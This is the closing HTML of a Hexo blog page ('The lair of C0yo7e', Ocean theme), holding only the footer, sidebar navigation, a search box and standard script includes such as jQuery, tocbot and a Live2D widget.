      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean">Ocean</a></li>
    </ul>
  </div>
</footer>

</main>

<aside class="sidebar sidebar-specter">
  
    <button class="navbar-toggle"></button>
<nav class="navbar">
  
    <div class="logo">
      <a href="/"><img src="/images/time.png" alt="The lair of C0yo7e"></a>
    </div>
  
  <ul class="nav nav-main">
    
      <li class="nav-item">
        <a class="nav-item-link" href="/">Home</a>
      </li>
    
      <li class="nav-item">
        <a class="nav-item-link" href="/archives">Archives</a>
      </li>
    
      <li class="nav-item">
        <a class="nav-item-link" href="/about">About</a>
      </li>
    
    <li class="nav-item">
      <a class="nav-item-link nav-item-search" title="搜索">
        <i class="fe fe-search"></i>
        Search
      </a>
    </li>
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      <div class="totop" id="totop">
  <i class="fe fe-rocket"></i>
</div>
    </li>
    <li class="nav-item">
      
        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
          <i class="fe fe-feed"></i>
        </a>
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
  </aside>
  <script src="/js/jquery-2.0.3.min.js"></script>
<script src="/js/jquery.justifiedGallery.min.js"></script>
<script src="/js/lazyload.min.js"></script>
<script src="/js/busuanzi-2.3.pure.min.js"></script>

  <script src="/fancybox/jquery.fancybox.min.js"></script>



  <script src="/js/tocbot.min.js"></script>
  <script>
    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
    tocbot.init({
      tocSelector: '.tocbot',
      contentSelector: '.article-entry',
      headingSelector: 'h1, h2, h3, h4, h5, h6',
      hasInnerContainers: true,
      scrollSmooth: true,
      positionFixedSelector: '.tocbot',
      positionFixedClass: 'is-position-fixed',
      fixedSidebarOffset: 'auto',
    });
  </script>


<script src="/js/ocean.js"></script>

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>